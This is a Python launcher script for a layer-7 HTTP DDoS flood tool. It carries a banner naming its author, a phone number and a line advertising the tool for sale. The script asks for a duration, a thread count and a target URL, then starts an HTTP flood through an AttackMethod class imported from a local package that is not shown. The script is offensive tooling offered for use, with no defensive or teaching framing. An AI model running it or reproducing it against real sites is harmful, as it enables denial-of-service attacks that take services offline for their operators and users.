import sys
import os
import time
import socket
import random
from colorama import Fore, Back, Style
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

#Colour
yellow='\033[93m'
gren='\033[92m'
cyan='\033[96m'
pink='\033[95m'
red='\033[91m'
b='\033[1m'
# Import modules
import os
import sys
import argparse
from colorama import Fore

os.system("@cls & @title Bui Quang Khai DDOS Tool by: BQK and Beta & @color e")

# Get the actual directory
os.chdir(os.path.dirname(os.path.realpath(__file__)))

try:
    from tools.crash import CriticalError
    import tools.addons.clean
    import tools.addons.logo
    # import tools.addons.winpcap
    import tools.addons.wireshark
    from tools.method import AttackMethod
except ImportError as err:
    CriticalError("Failed to import some packages", err)
    sys.exit(1)

method = "HTTP"
logo = """
=====[BQK-DdoS]=====
                                ,-.
                               ( O_)
                              / `-/
                             /-. /
                            /   )
                           /   /
              _           /-. /
             (_)*-._     /   )
               *-._ *-'**( )/
My name is         *-/*-._* `.
Bui Quang Khai      /     *-.'._
i'm Tricker        /\       /-._*-._
    _,---...__    /  ) _,-*/    *-(_)
___<__(|) _   **-/  / /   /
 '  `----' **-.   \/ /   /
               )  ] /   /
       ____..-'   //   /                       )
   ,-**      __.,'/   /   ___                 /,
  /    ,--**/  / /   /,-**   ***-.          ,'/
 [    (    /  / /   /  ,.---,_   `._   _,-','
  /    `-./  / /   /  /       `-._  *** ,-'
   `-._  /  / /   /_,'            **--*
       */  / /   /*
       /  / /   /
      /  / /   / ~~> Beta Version  <~~
     /  |,'   /  ~~> 0352876128    <~~
    :   /    /   ~~> Mua tool ib   <~~
    [  /   ,'    ~~> BQK. X .DdoS  <~~
    | /  ,'
    |/,-'
    ' 
"""
CRED2 = '\33[91m'

if __name__ == "__main__":
    # Print help
    os.system('cls' if os.name == 'nt' else 'clear')
    print(CRED2 + logo + CRED2)
    print("├───DDOS TOOL LAYER 7")
    time = int(input(f"{Fore.RED}│   ├───TIME:{Fore.RESET}"))
    threads = int(input(f"{Fore.RED}│   └───THREADS:{Fore.RESET}"))
    target = str(input(f"{Fore.RED}│   └───URL:{Fore.RESET}"))
    with AttackMethod(
        duration=time, name=method, threads=threads, target=target
    ) as Flood:
        Flood.Start()
else:
    sys.exit(1)
